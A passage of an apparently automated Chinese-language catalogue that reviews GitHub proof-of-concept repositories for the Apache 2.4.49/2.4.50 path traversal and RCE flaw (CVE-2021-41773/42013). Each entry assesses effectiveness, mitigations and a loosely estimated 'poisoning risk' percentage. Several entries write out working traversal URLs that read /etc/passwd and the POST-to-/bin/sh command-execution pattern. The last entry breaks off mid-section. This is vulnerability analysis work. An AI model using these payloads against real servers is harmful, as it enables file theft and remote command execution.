README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
